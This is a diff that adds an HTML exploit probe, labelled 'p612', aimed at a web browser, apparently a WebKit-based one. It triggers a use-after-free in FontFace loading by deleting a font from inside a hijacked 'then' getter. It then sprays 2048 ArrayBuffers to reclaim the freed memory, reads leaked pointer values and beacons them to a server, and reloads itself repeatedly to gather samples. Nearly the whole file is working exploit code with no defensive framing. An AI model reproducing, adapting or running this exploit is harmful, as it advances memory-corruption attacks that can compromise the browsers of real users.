@@ -1,0 +1,69 @@
+<!--
+  p612: T-determinism measurement probe.
+  Minimal FontFace UAF — trigger, spray 2048x192B, read T from +0x58.
+  Reports ONLY T value and hit index. Designed for 16+ cold boot repetitions.
+  Auto-reloads after 4s to accumulate samples within one server log.
+
+  CRASH_CLASS: HIGH (UAF trigger)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p612</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+var N=0;try{N=parseInt(localStorage.getItem('p612n')||'0');}catch(e){}
+
+function main(){
+b('P612-N'+N);
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+
+var lane=[];
+for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+for(var j=0;j<lane.length;j++){
+  wD(lane[j],0x00,2);
+  wD(lane[j],0x60,0);
+  wD(lane[j],0x64,0xFFFFFFFF);
+  lane[j][0x82]=3;
+}
+window._l=lane;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+setTimeout(function(){
+  var lane=window._l;if(!lane){b('P612-NOLANE');return;}
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i],rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){
+      var T=rQ(v,0x58);
+      var W=rQ(v,0x68);
+      b('P612-HIT-N'+N+'-b'+i+'-T='+T+'-W='+W+'-rc='+rc);
+      try{localStorage.setItem('p612n',String(N+1));}catch(e){}
+
+      // Auto-kill WebProcess after 2s to get a fresh process on next load
+      setTimeout(function(){
+        try{window.open('about:blank','_blank');}catch(e){}
+        // Reload after kill attempt
+        setTimeout(function(){location.reload();},1500);
+      },2000);
+      return;
+    }
+  }
+  b('P612-MISS-N'+N);
+  try{localStorage.setItem('p612n',String(N+1));}catch(e){}
+  setTimeout(function(){location.reload();},2000);
+},120);
+}
+setTimeout(main,200);
+</script></head><body>p612: T-determinism (run #<script>document.write(N)</script>)</body></html>
